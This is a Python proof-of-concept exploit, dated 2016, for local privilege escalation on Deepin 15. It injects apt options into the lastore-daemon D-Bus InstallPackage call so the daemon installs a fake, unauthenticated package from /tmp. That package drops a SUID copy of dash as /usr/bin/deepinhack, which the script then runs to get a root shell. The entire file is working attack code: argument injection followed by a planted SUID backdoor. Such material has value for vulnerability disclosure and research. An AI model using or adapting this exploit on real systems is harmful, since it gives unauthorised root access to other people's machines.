#!/usr/bin/env python
# encoding=utf8

# privilege escalation POC for deepin 15 with lastore-daemon.
# Copyright (C) 2016 King's Way <root#kings-way.info>

import os
import dbus
import time

from shutil import copyfile

# First to prepare fake package and package list file

print "Trying to copy files to /tmp..."
if not os.path.exists("/tmp/lists"):
    os.mkdir("/tmp/lists")
if not os.path.exists("/tmp/archives"):
    os.mkdir("/tmp/archives")

copyfile("./deepinhack_0.0.1_amd64.deb", "/tmp/archives/deepinhack_0.0.1_amd64.deb")
lists = open("/tmp/lists/packages.deepin.com_deepin_dists_unstable_main_binary-amd64_Packages", "w")
lists.write("Package: deepinhack\n"
            "Version: 0.0.1\n"
            "Maintainer: King's Way <root#kings-way.info>\n"
            "Architecture: amd64\n"
            "Size: 51122\n"
            "SHA256: 3c135fb86c3a018060b55e748ad7e12b484433f1743b704ffc14e1a32f46ad12\n"
            "SHA1: d0c93664608c06433d3a95629258d5ed246d946a\n"
            "MD5sum: 1c15a6e8346c44c6e8c23a4becca839e\n"
            "Description: privilege escalation POC for deepin 15 with lastore-daemon. Created by King's Way @ 20160130\n"
            "Description-md5: c8dc28d1e85139704ec222606f31c6f9\n"
            "Section: utils\n"
            "Priority: optional\n"
            "Filename: pool/main/d/deepinhack_0.0.1_amd64.deb\n")
lists.close()


# Connect to SystemBus and Get the interface of lastore.Manager
print "Trying to connect to SystemBus and Get the interface of lastore.Manager..."
bus = dbus.SystemBus()
proxy_object = bus.get_object("com.deepin.lastore", "/com/deepin/lastore")
lastore_interface = dbus.Interface(proxy_object, "com.deepin.lastore.Manager")

# Submit a job to install deepinhack
print "Trying to submit  a job to install deepinhack..."
reply = lastore_interface.InstallPackage("deepinhack_install", "-o Dir::State::Lists=/tmp/lists -o Dir::Cache::Archives=/tmp/archives -y --allow-unauthenticated deepinhack")
print "Reply from lastore.Manager: ", reply

print "Just wait and see..."

while not os.path.exists("/usr/bin/deepinhack"):
    print "Have not found deepinhack in /usr/bin/... Sleep for 2 seconds..."
    time.sleep(2)

print "\nFound it! Trying to run..."
os.system("/usr/bin/deepinhack")

choice = raw_input("\n\n /usr/bin/deepinhack is copied from dash and with SUID bit\n"
                   " Do you want to remove the deepinhack Package?  [y/N]  ")
if choice == 'y':
    lastore_interface.RemovePackage("deepinhack_remove", "deepinhack")
    print "\nMessage has been sent to lastore-daemon...\n" \
          "Quitting now..."
bus.close()
quit(0)

